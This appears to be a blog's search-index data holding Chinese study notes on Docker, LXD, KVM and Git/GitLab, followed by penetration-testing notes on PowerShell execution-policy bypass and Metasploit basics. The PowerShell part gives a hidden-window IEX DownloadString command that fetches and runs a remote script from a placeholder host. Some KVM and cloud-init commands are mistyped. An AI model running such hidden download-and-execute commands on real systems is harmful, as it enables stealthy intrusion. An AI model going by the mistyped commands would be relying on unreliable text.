映像层所有的Docker映像都源自于一个基础镜像(Debian/Ubuntu) –\u003e 只读，不可修改i 其他的功能模块附加于基础影像形成最终程序 Docker images 是构建Docker container的基础 Docker 层/容器层 每个映像有唯一的ID(SHA256/ 取前6字节来显示) docker images # 可看到唯一的image id # TAG: 默认是最新版本(latest) docker images --no-trunc # 可以看到完整的SHA256完整的字节 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:3","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Docker容器 images是只读的，在基础上创建并运行容器(可读写) # 查看运行的容器（每个容器都有唯一的id） docker ps # 不显示关闭的容器 docker ps -a # 显示所有状态的容器 #显示字段： 有容器id, 基于image的名字，command, 容器创建时间， status, ports, names(随机生成的,可以改) # 基于image运行容器(每次运行一次都产生一个新的容器!) docker run busybox echo \"hello\" docker run busybox:1-uclibc echo \"hello\" # 指定标签来用哪个(如果本机没有，会自动pull) # docker run -i -t busybox:ubuntu-16.04 # 删除容器 docker stop d751d48a6d0a # 如果运行了先stop掉 docker rm d751d48a6d0a pull的时候，默认会去一个人url地址寻找镜像 Docker Resigtry相当于目录，Repository相当于具体文件位置 可以自建映像库 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:4","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Docker使用 基本命令 # 运行镜像后交互登录入容器（这里基于ubuntu） # --name 修改容器的默认名字，指定 docker run --name xxx01 -it ubuntu /bin/bash # 退出 exit / ctrl + D # 退出容器终端，但退出不关闭容器 ctrl + P , ctrl + Q # 组合 # 启动容器 docker start id_id_id # 继续进入正在运行的容器 docker attach xxx01 # 重命名容器 docker rename 453dsdaojp test01 # 容器与镜像对比变化 docker diff 453dsdaojp test02 - C:修改了 - A:增加了 - D:删除了 ### 日常管理命令 docker start 453dsdaojp docker restart 453dsdaojp docker stop 453dsdaojp docker rename 453dsdaojp docker pause 453dsdaojp # 挂起 docker unpause 453dsdaojp # 恢复 创建映像 docker run -it ubuntu /bin/bash .... # 进入容器进行一些了修改 ctrl + p, ctrl + q docker commit test01 xps/test:0.1 # 创建了新的image # 然后可以上传到docker Resigtry # 后面就跟别的image一样使用可以创建容器等 后台运行容器 # 不进入交互方式的shell docker run -d ubuntu /bin/bash -c \"while true; sleep 3; do date\";done 查看日志 docker logs 453dsdaojp 实例 # 配置一个apache，并可以外部访问 docker run -dit -p 8080:80 ubuntu /bin/bash # 端口映射(外部:容器端口) docker attach doasdkop463fd # 进入容器 apt update \u0026\u0026 apt install apache2 # 正常操作 /etc/init.d/apache2 start ctrl+p, ctrl+Q # 宿主机浏览器访问 http://宿主机ip:8080 ## 服务自动启动(或者手动把下面内容输入进去) echo '/etc/init.d/apache2 start' \u003e\u003e /etc/bash/rc ## 基于配置好的容器创建新的镜像 docker commit ubuntu xps/apache1:0.1 # 创建了新的image # 打包好之后上传到hub，就可以正常下载和使用image了 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:5","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Dockerfiles 前面的下载，制作，上传，再下载的方法也挺麻烦的 使用Dockerfile自动创建映像（Dockerfile文本文件，包含创建容器的指令） 这里还是以apacha2为例 1.先写配置文件 # vim Dockerfile FROM ubuntu # 从官方下载镜像 MAINTAINER xps \u003cxps@admin.com\u003e RUN apt update; apt dist-upgrade -y RUN apt install -y apache2 vim RUN echo '/etc/init.d/apache2 start' \u003e\u003e /etc/bash/rc 2.基于dockerfile来创建容器 # 标签自己定义即可, 最后的点(.) 表示当前目录下的dockerfile docker build -t test/apache-server:1.0 . # 然后run创建启动容器 docker run -dit -p 8080:80 test/apache-server:1.0 /bin/bash PS: 更深入的Dockerfile知识再另外学 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:6","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"docker-compose **作用：**之前运行一个镜像，需要添加大量的参数，可以通过Docker-Compose编写这些参数，Docker-Compose可以帮助我们批量的管理容器，只需要通过一个docker-compose.yml文件去维护。 下载：https://github.com/docker/compose/releases https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-darwin-aarch64 参考文章：https://blog.csdn.net/chenfeidi1/article/details/80866841?spm=1001.2101.3001.6650.1\u0026utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1-80866841-blog-122964874.pc_relevant_without_ctrlist_v3\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1-80866841-blog-122964874.pc_relevant_without_ctrlist_v3\u0026utm_relevant_index=2 https://www.jb51.net/article/237876.htm ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:3:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"官方docker-compose.yml version: \"3\" services: redis: image: redis:alpine ports: - \"6379\" networks: - frontend deploy: replicas: 2 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure db: image: postgres:9.4 volumes: - db-data:/var/lib/postgresql/data networks: - backend deploy: placement: constraints: [node.role == manager] vote: image: dockersamples/examplevotingapp_vote:before ports: - 5000:80 networks: - frontend depends_on: - redis deploy: replicas: 2 update_config: parallelism: 2 restart_policy: condition: on-failure result: image: dockersamples/examplevotingapp_result:before ports: - 5001:80 networks: - backend depends_on: - db deploy: replicas: 1 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure worker: image: dockersamples/examplevotingapp_worker networks: - frontend - backend deploy: mode: replicated replicas: 1 labels: [APP=VOTING] restart_policy: condition: on-failure delay: 10s max_attempts: 3 window: 120s placement: constraints: [node.role == manager] visualizer: image: dockersamples/visualizer:stable ports: - \"8080:8080\" stop_grace_period: 1m30s volumes: - \"/var/run/docker.sock:/var/run/docker.sock\" deploy: placement: constraints: [node.role == manager] networks: frontend: backend: volumes: db-data: ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:3:1","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Docker-compose管理Mysql和apache容器 yml文件以key：value方式来指定配置信息，多个配置信息以换行+缩进的方式来区分，在docker-compose.yml文件中，不要使用制表符就是tab键，规则用两个空格缩进 version: '3.1' # 指定了 compose file 的版本 services: mysql: #服务名称 restart: always #代表只要docker启动，那么这个容器就跟着一起启动 image: daocloud.io/library/mysql:5.7.4 #指定镜像路径 container_name: mysql #指定容器名称 ports: - 3306:3306 #指定端口的映射 environment: MYSQL_ROOT_PASSWORD: 123456 #指定MySQL账号root的密码 TZ: Asia/shanghai #指定时区 volumes: - /opt/docker_mysql_tomcat/mysql:/var/lib/mysql #指定映射数据卷 httpd: restart: always image: php:7.2-apache container_name: apache ports: - 80:80 environment: TZ: Asia/shanghai volumes: - /opt/docker_mysql_tomcat/www:/var/www/html - /opt/docker_mysql_tomcat/logs:/var/log/apache2 操作命令： docker-compose up -d 基于docker-compose.yml启动管理容器 docker-compose down 关闭并删除容器 docker-compose start|stop|restart 开启|关闭|重启已经存在的由docker-compose维护的容器 docker-compose ps 查看由docker-compose管理的容器 docker-compose logs -f 查看日志 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:3:2","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"docker-compose配置Dockerfile使用 使用docker-compose.yml文件以及Dockerfile文件在生成自定义镜像的同时启动当前镜像，并且由docker-compose去管理器 version: '3.1' services: ssm: restart: always build: # build 指定构建镜像上下文、Dockerfile 文件和 ARGS 等。 context: ../ dockerfile: Dockerfile image: ssm:1.0.1 container_name: ssm ports: - 80:80 environment: TZ: Asia/Shanghai 创建Dcokerfile from php:7.2-apache copy wordpress /var/www/html 依赖docker-compose.yml启动容器 docker-compose up -d ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:3:3","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"LXD 特点 - lxd 新部署容器过程比Docker更容易 - 退出容器时不必以特定的方式退出 - lxd 容器中没有层的概念 - Docker中的层可以使部署更快(没有清理也可能感觉混乱) 安装 # snap适用所有发行版本 sudo snap install lxd # sudo apt install lxd # ubuntu官方包apt一般中不会是最新的软件包 sudo usermod -aG lxd ${USER} # 当前用户加入lxd组，就具有管理权限了 # 重启主机 初始化 lxd init # 回答问题(默认即可) 运行容器 # 创建容器 lxc launch ubuntu:18.04 C01 # C01是容器名称 # 自动从远程服务器下载映像并创建、运行容器(从国外下载，速度稍微慢) # - lxd命令针对lxd管理层 # - 容器管理命令仍然使用lxc 常用管理命令 lxc list # 列出所有的容器 lxc start c_name # 启动容器 lxc stop c_name # 停止容器 lxc delete c_name # 删除容器 lxc image list # 查看镜像 lxc image delete # 删除镜像 交互登录容器 # 执行某个容器的什么命令 lxc exec C01 bash # root帐号登录 lxc exec C01 -- sudo --login --user ubuntu # ubuntu镜像包含一个默认账户ubuntu # 在本地终端直接执行容器内部的命令 lxc exec C01 -- apt update # 退出容器(容器依然是run的状态) ctrl+D / exit 随宿主机的启动, 自动启动某个容器 lxc config set C01 boot.autostart 1 远程映像存储服务器 # 列出远程映像存储服务器 lxc remote list # 默认三个 - images # 存储其他Linux发行版镜像 - ubuntu # ubuntu自己正式发布的系统镜像 - ubuntu-daily # ubuntu自己的非正式的系统镜像(每天更新的) 从远程复制映像 lxc launch images:debian/stretch test01 # 只下载映像到本地，不创建容器 lxc image copy ubuntu-daily:18.10 local: --alias u1910 lxc image list # 查看本地的映像 # 从本地映像来创建容器 lxc launch u1910 c03 # 查看本地容器 lxc list 对容器进行上传下载文件 # 直接在宿主机器上执行 lxc file pull c01/etc/hosts . # 把文件下载到当前目录 lxc file push hosts c01/tmp/ # 上传文件到容器中路径 # 当然，也可以进入交互shell复制 lxc exec C01 bash 映像自动更新间隔(小时) # 每隔24小时自动更新映像 lxc config set images.auto_update_interval 24 自动清除未使用的映像(天数) lxc config ser images.remote_cache_expiry 5 查看配置 lxc config show 实例 # 安装apache2 lxc exec c01 bash apt update \u0026\u0026 apt install apache2 ip addr show curl 1.1.1.1 外部网络对容器内部访问 - 防火墙规则路由流量 - 创建配置我呢见DHCP 获取物理网络地址(类似VM) - 宿主机创建桥接网卡 br0 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:4:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"k8s ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:5:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":" 云计算 资源就像水龙头里的水，按需索取 信息时代计算资源是最主要的生产力 主机时代、网络时代 集中和分散、三十年河东三十年河西 量子计算可能颠覆一切 计算资源的云化 按需调度、按需索取 计算资源需要更大程度的颗粒度细化 虚拟化是计算资源细分的基础 处理器运算能力的大幅提升 处理速度月来越快（摩尔定律） 多核处理器架构 大量计算资源限制浪费，企业整体运行成本高 多应用同机部署，应用隔离差，稳定性影响大 处理器支持虚拟化技术 分类 1.Saas： Software as a Service # 软件即服务， 服务以软件形式交付 Gmail / Google Docs / 在线Office / Office 365 ... 无需本地安装部署 2.PaaS： Platform as a Service # 平台即服务 提供软件开发运行的基础平台 API、Google App Engine 3.IaaS： Infrastructure as a Service # 基础架构即服务 最底层的晕计算，物理的计算、存储、网络资源饭各位你 AWS、Google Computer Engine、 阿里云 云计算是将资源打碎、分配、发布、交付的一组工具的合集 Hypervisors -\u003e 使得虚拟服务器的性能不依赖物理机，和物理机是平行的，可以直接访问物理的CPU # 常见的虚拟化软件 KVM、XEN(目前部署方式是完整的光盘)、QEMU、Virtualbox、VMWare # 本章主要学这两个：KVM、EMU 云计算平台 # ubuntu上最典型的 Openstack 服务编排工具 # 典型的 Juju 机器配置工具 MAAS ","date":"2020-05-10","objectID":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/:1:0","tags":["Linux","ubuntu","KVM","虚拟化"],"title":"ubuntu server-虚拟化","uri":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"categories":["Linux"],"content":" 虚拟化 物理服务器，部署虚拟化平台，创建多个虚拟机，每个虚拟机使用物理机的计算量。虚拟化是云计算的基础 降低成本，提高利用率，方便管理部署，快速恢复还原 普遍用于开发测试实验、生产环境部署都可 需要硬件支持(BIOS设置开启) CPU特性 Hypervision ","date":"2020-05-10","objectID":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/:2:0","tags":["Linux","ubuntu","KVM","虚拟化"],"title":"ubuntu server-虚拟化","uri":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"categories":["Linux"],"content":"KVM Kernel-based Virtual Machine（KVM） 基于内核的虚拟机(KVM)和快速仿真器(QEMU)组成的虚拟化套件( QEMU/KVM ) QEMU/KVM在没有硬件虚拟化支持下，虚拟机需要运行在QEMU模拟器中 有硬件虚拟化支持下，接近硬件物理机速度运行 虚拟化扩展决定性能( virtualization extensions ) Ubuntu默认内建支持的虚拟化方案 内建于Linux内核( Intel 的kvm-intel.ko或AMD的kvm-amd.ko ) libvirt库是Linux与虚拟化通信的统一 接口 处理在主机和客户机之间分离任务所需的低级指令 无法并行运行VirtualBox和KVM虛拟机，它们会抢占CPU的虚拟化功能 把KVM和QEMU结合在一起 通过libvirt库实现Linux与虚拟化通信的接口 验证硬件平台支持虚拟化拓展(较新的硬件全部支持) 四种方法 # F1 egrep -c '(vmx|svm)' /proc/cpuinfo # 结果不为0即支持 erep -E 'vmx|svm' /proc/cpuinfo # 结果不为0即支持 # F2 kvm-ok # sudo apt install cpu-checker # F3 lscpu # 找下列字段： # Virtualization: VT-x # Flags: vmx # F4 sudo virt-host-validate # sudo apt install libvirt-client # Checking for hardware virtualizatin: PASS 可以在virtualbox或vmware虚拟机里面安装kvm的虚拟机 KVM安装和使用 安装服务端组件 # bridge-utils桥接的防止，用来做地址转换的 sudo apt install bridge-utils libvirt-bin qemu-kvm qemu-system # 当前用户会被加入livirt组 # 需要重启系统使得权限生效 # 映像文件目录(以后的虚拟机文件都会放在这里) /var/lib/libcirt/images # 配置文件 /etc/libvirt/libvirtd.conf 权限(读写,管理)的修改，加密证书等。一般不需要配置。 安装客户端组件 1.图形化的客户端管理工具 # 1.图形化的管理工具(virt-manager)，ssh-askpass是用来ssh连接远程主机使用的 sudo apt install virt-manager ssh-askpass # 客户端的使用 可以新建连接：选择连接哪个机器(本机、远程机器)的kvm后台 创建虚拟机:跟virtualbox的就类似了，Add Pool指定iso文件的路径来挂载寻找 # 2.也有字符界面的客户端管理工具 网卡桥接配置 默认虚拟机网络模式为NAT（可以访问外部网络，但外部计算机无法访问虚拟机），可以使用网桥实现VM被外部网络访问 网桥的配置 # sudo vim /etc/netplan/50-cloud-init.yaml # 新增配置 ethernets: ens33: dhcp4: no # 这个分给网桥，所以这个物理网卡不能有ip地址 dhcp6: no bridegs: # 配置网桥 br0: interfaces: [ens33] dhcp4: no addresses: [172.16.24.13/24] gatewat4: 172.16.24.1 nameservers: addresses: [8.8.8.8,8.8.4.4] # 让配置生效 sudo netplan apply 虚拟机配置：选择虚拟机，选择第二个窗口，选择网卡，Bridge模式，选择设备，启动虚拟机 建立连接 virt-manager 本机/ 网络 连接 virt-manager 基本使用 克隆创建虚拟机 KVM不支持模板功能，但可将虚拟机关机作为模板使用(右键，clone, 基于它作为\"模板\") # 创建虚拟机快，占资源少 虚拟机管理控制台（有很多好用的功能） **迁移(Migrate) **–\u003e 把某宿主机上(出现故障了)某台虚拟机迁移到另一台安装了kvm服务的服务器上 2.命令行客户端 命令行方便写脚本，·批量进行很多虚拟机的安装和管理 创建虚拟机 # 命令行创建虚拟机 virt-install sudo virt-install -n web1 -r 2048 --disk path=/var/lib/libcire/images/web1.img,bus=virtio,size=10 -c ubuntu-18.04-server-amd64.iso --newwork newtork=default,model=virtio --graphics vnc, listen=0.0.0.0 --noautoconsele -v # --disk path 虚拟机镜像文件存放路径 # size=4 硬盘文件大小4G # bus=virtio 总线类型 # -c CDROM（iso文件、物理光驱） # --newwork newtork=default，model=virtio 接口模式 # --graphics vnc, listen=0.0.0.0 VNC控制接口 # --noautoconsele 不自动连接虚拟机控制台 复制虚拟机 sudo virt-clone -o win10 -n win10-2 -f /var/lib/libcire/images/win10-2.img # -o 原始虚拟机 # -n 新建虚拟机 # -f 虚拟机镜像文件存放路径 建立连接 virsh connect qemu:///192.168.0.12 查看vm服务器上所有VM # 查看run的 virsh list # 查看所有状态的 virsh list --all 管理VM virsh console centos_01 关闭当前console ctrl + ] 正常关机 virsh shutdown centos_01 强制关机 virsh destory centos_01 删除虚拟机 virsh undefine centos_01 挂起VM virsh suspend centos_01 恢复使用VM virsh resume centos_01 使用云平台 下载适合不同环境的镜像: https://cloud-images.ubuntu.com/releases/bionic/release wget /ubuntu-18.04-server-cloudimg-amd64.img -O u18.img.dist 解压下载的镜像文件 qemu-img convert -O qcow2 u18.img.dist u18.img # 不能直接使用，可以理解这个为一个模板 创建用户数据文件 vim cloud-config # cloud-config passwdor: 123465 chpasswd: { expire: Flase } # 密码不过期 ssh_pwauth: True # 允许ssh身份认证 生成用户数据盘 # 基于模板创建一个新的数据盘 cloud-localds user-data.img cloud-config # 使用上面的配置文件 启动虚拟机 kvm -m 2048 -smp 2 -hda u18.img -hdb user-data.img -net nic -net user,hostfwd=tcp::1810-:22 -nographic # 帐号密码: ubuntu / 123465(上面配置文件指定的) sudo passwd ubuntu # 修改密码 删除云镜像初始化脚本 sudo apt-get remove cloud-init 使用云镜像创建VM 部署完一个之后，就可以基于第一个进行clone ","date":"2020-05-10","objectID":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/:2:1","tags":["Linux","ubuntu","KVM","虚拟化"],"title":"ubuntu server-虚拟化","uri":"/ubuntu-server-%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"categories":["Linux"],"content":"107-版本控制 ","date":"2020-05-10","objectID":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/:0:0","tags":["Linux","ubuntu","Git","GitLab"],"title":"ubuntu server-版本控制","uri":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"categories":["Linux"],"content":"概述 简介 version control system（版本控制系统） revision control system (修订控制系统) 开发工具，但不仅限于源码文件 记录文件的每次变更 随时可以回到历史状态 文件以及元数据的变更（修改人、修改理由、具体修改内容、时间戳） 配置文件是除数据之外第二大资产 团队写作 分类 Centralized version control systems (SVCS) 集中式版本控制 集中存储修改，颗粒控制细，但是单点故障隐患 CSV / Subersion distributed version control systems (DVCS) 分布式版本控制 分布式存储库的完整拷贝 Git / Mercurial / Bazaar(Ubuntu官方在开发时候使用的) 每个人维护本地库，完成后上传到服务器 指针指向当前最新版本 随着回滚还原历史版本 ","date":"2020-05-10","objectID":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/:1:0","tags":["Linux","ubuntu","Git","GitLab"],"title":"ubuntu server-版本控制","uri":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"categories":["Linux"],"content":"Git 最初由Linux内核创始人开发 Git作为开发工具而生 适合大型项目的版本管理 Git库保存所有程序员的团队成果 Git默认使用OpenSSH 服务器上的Git用户需要能够修改目录(库) 一个库就是一个文件夹(库配置信息: .git目录) 无需独立的专职服务器，满足存储空间需求可共用 github目前世界上最大的代码托管服务商（已被微软收购） 服务端 安装 # 1. ubuntu自带的(和git自带的版本不一样,不是最新的) # sudo -s 把自己提升成root权限，后面就不用输入sudo了 apt install git mkdir /git # 创建一个文件夹(后续作为一些git库的存放位置) chown xps:xps /git cd /git git init --bare apache2 # 创建一个裸库,名字叫apache2（空的框架库，不存在数据） /var/log/auth.log # ssh登录问题诊断 # 2.使用ppa库方式安装 sudo add-apt-repository ppa:git-core/ppa sudo apt update sudo apt install git git version # 版本比ubuntu库中的新 然后和上面一样创建存放git库的目录 客户端 使用 # 客户端和服务端都是安装的同一个git软件包 # 其实客户端本身也可以作为一个本地的git服务器 # 基本配置 git config --global user.name \"Your Name\" git config --global user.email \"eamail@domain.com\" git config --list # 查看配置信息 git help # 查看常用的git二级命令 git help -a # 查看所有的子命令 git help -g # 查看所有的子命令, 并有描述 git help everyday # man giteveryday 查看具体某一个子命令的用法 git客户端连接服务器 mkdir /git # 同样创建一个文件夹 chown xps:xps /git cd /git # 作为客户端，从远程服务端clone库(是服务端的绝对路径) git clone xps@192.168.0.105:/git/web # .git目录存放配置信息(使之成为git库)，删除此目录就是一个普通文件夹 # 其中config文件包含远程服务器地址信息(写好之后以后就不用手动输入信息；) [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = xps@192.168.0.105:/git/web fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master 常用git命令 # 查看状态 git status # 追加变更到git的追踪 git add . # 所有文件 git add file_name # 指定文件 # 提交变更给本地git库 git commit -a -m \"第一次提交\" # 同步到服务器（orign等在config文件已经写好了） # 提交之前必须服务器的内容是最新的版本，先git pull, 再push git push orign master # 从服务器更新 git pull # 服务端数据存储结构与客户端不同(数据库) # 撤销文件的变更(不仅仅对文件，对版本也可撤销) git checkout \u003cfile\u003e # 回退最近的版本 # 比对来查看文件的修改变化 git diff index.html # 内容(对比的两个文件) --- a/4.conf +++ b/4.conf ########### 切回历史上任何一个版本 apt install tig # 方法很多，这里使用了tig tig # 直接查看历史版本(移动到版本上，下面会有版本号hash值)，回车会看到具体变更内容 git checkout ddwe23e353c0d6665406e7c07djaoid2d # 切回到指定版本 # 只是指针临时指向了之前的版本，没显示后面的版本(但是后面的版本还是存在的) # 如果验证没问题，先回到最新状态 git checkout master # 回滚(只是回滚那一个版本的所做的变更, 不是回退到那，也不影响之后的版本) --\u003e 从当前最新版本的基础山，去掉前面某一个版本中所做的变更 git revert master ddwe23e353c0d6665406e7c07djaoid2d 不仅仅的对代码，对配置文件也可以 是个好习惯 # 例子 :apache的配置文件 cp -rp /etc/apache2 /etc/apache2.bak mv /etc/apache2/* /git/apache2 rm /etc/apache2 # 这里千万不能重启 find /git/apache2 -name '.?*' -prune -o -exec chown root:root {} + # 排除.git(.?*)，其他的都改为root ln -s /git/apache2 /etc/apache2 # 做个软链接(可以让应用读取到配置文件) systemctl reload apache2 # 以后修改就在git仓库修改，并进行add和commit和push，以便出问题回滚 Github 开源项目可以使用，前面自己在服务器搭建的git服务器可以自己公司用(商用的肯定要自己内部建版本控制服务器) 机密\u0026隐私信息不建议放到开源平台 创建并同步新库 ## 1.在本地新建(已有库)，然后关联到github仓库 echo \"# new\" \u003e\u003e README.md git init git add README.md git commit -m \"first\" git remote add origin https://github.com/xps/new.git # 连接远程仓库，同步现有库 git pull # 先把服务器的版本同步到本地，然后才能正常提交 git push -u origin master # 提交到远程github仓库 # 如果要用ssh协议， 要在github的仓库的setting的的Deploy Key # 然后本地 .ssd/id_rsa.pub 公钥粘贴上去 # 然后就不用输入密码了 ## 2.在github新建，然后clone下来，再提交 GitHub pages 通过github上传页面文件建站(目前只是静态的) # 新建库名为： user_name.github.io # 现在本地创建已有库也行(参照同步到github库) git clone https://github.com/user_name.github.io cd user_name.github.io/ echo \"hello world\" \u003e index.html # 可以在本地设置好页面(静态网站)，再上传 git add . git commit -m \"init commit\" git remote add origin https://github.com/user_name.github.io git push -u origin master # 浏览器访问 https://user_name.github.io SSH Key连接库 Clonr or Download -\u003e CLone with SSH Setting -\u003e Deploy keys -\u003e Add git clone git @github.com:xps/test.git GitLab GitLab是开源的Git库Web界面（包含团队写协作工具 GitLab mattermost -\u003e即时聊天沟通的） 基于Ruby语言开发的Web应用程序 所有组件全部打包集成（Postgresql, redis, nginx, logrotate, Sidekiq, Unicron） 如果想要要支持MySQL数据库，社区版需要手动安装 安装需求 最小：单核，1GB，适当存储空间(400MB)，100用户以下(建议双核、2GB以上) 安装 ### 集成安装方式 https://packages.gitlab.com/gitlab/gitlab-ce/ # ubuntu(安装软件源) curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash # 开始安装(等待时间比较长) sudo apt install gitlab-ce # 自动初始化配置 sudo gitlab-ctl reconfigure # 查看状态 sudo gitlab-ctl status # 然后就可以访问了， 设置初始root帐号密码 # 默认是只有一个root管理员 # 和github等的使用体验是类似的 配置 /etc/gitlab/gitlab.rb # 配置文件 external_url #","date":"2020-05-10","objectID":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/:2:0","tags":["Linux","ubuntu","Git","GitLab"],"title":"ubuntu server-版本控制","uri":"/ubuntu-server-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"categories":["渗透测试"],"content":"执行策略 Get-ExecutionPolicy #查看当前策略 # 四种 - Restricted #脚本不能运行（默认） - RemoteSigned #本地创建的脚本可以运行，但从网上下载的脚本不能运行 - AllSigned #仅当脚本由信任的发布者签名时才能运行 - Unrestricted #允许所有的脚本运行 # 设置PowerShell执行策略 Set-ExecutionPolicy \u003c策略名\u003e 绕过 # 先设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted # 再执行脚本 # 或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗, -NoProfile不加载当前用户配置 powershell.exe -executionpolicy bypass -Windowstyle hidden -Noninteractive -nologo -NoProfile -File xxx.sp1 # Noexit 执行结束不退出shell(对键盘记录等脚本非常有用) # 绕过本地权限执行 PowerShell.exe -ExecutionPolicy Bypass -File xxx.sp11 # 用IEX下载远程PS1脚本绕过 PowerShell.exe -ExecutionPolicy Bypass -Windowstyle hidden -Noninteractive -NoProfile IEX(New-ObjectNet.WebClient).DownloadString(\"http://xxxxx.xxx.ps1\");[Parameters] 5.更多执行策略绕过: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy ","date":"2020-05-09","objectID":"/powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/:0:0","tags":["PowerShel"],"title":"PowerShell执行策略的简单绕过","uri":"/powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/"},{"categories":["渗透测试"],"content":"MSF 最牛X的地方是：支持整个渗透测试过程 ","date":"2020-05-09","objectID":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/:0:0","tags":["Metasploit"],"title":"Metasploit初学-散记","uri":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/"},{"categories":["渗透测试"],"content":" 理论方面 技术架构 1.辅助模块（auxiliary） 包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2.渗透攻击模块(exploits) 利用程序，针对漏洞、权限进行利用，是主要使用的模块 3.攻击载荷模块(payload) 用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取 4.空指令模块(nops) 5.编码器模块(encoders) 6.后渗透攻击模块(post) 7.免杀模块(evasion) 接口 MSF有四种接口对外提供：msfconsole, msfcli, msfgui, msfweb 为什么要使用Metasploit 开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊 情报搜集阶段 有数据库 威胁建模阶段 漏洞分析阶段 后渗透攻击模块 报告生成模块 ","date":"2020-05-09","objectID":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/:1:0","tags":["Metasploit"],"title":"Metasploit初学-散记","uri":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/"},{"categories":["渗透测试"],"content":" 使用MSF 准备使用 启动MSF msfconsole 可以配置数据库等 更新MSF apt-get update apt-get install metasploit-framework 软件安装目录 /usr/share/metasploit-framework # 数据目录(其中一些字典和脚本我们用的时候可以拿) 模块 一个模块就是一个rb脚本 情报搜集 首先search 搜索有哪些可用的模块 1.网站敏感目录扫描： /usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥 ## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描 # 他们主要使用暴力猜解的方式工作，需要提供目录字典 # 使用模块 use auxiliary/scanner/http/dir_scanner # 查看详细信息 info # 查看需要设置的参数 show options # 设置参数（取消设置参数是 unset） set RHOTS 192.168.0.101 set PATH /cms/ # 攻击 exploit # 返回上一级退出当前模块 back # 两个可选命令 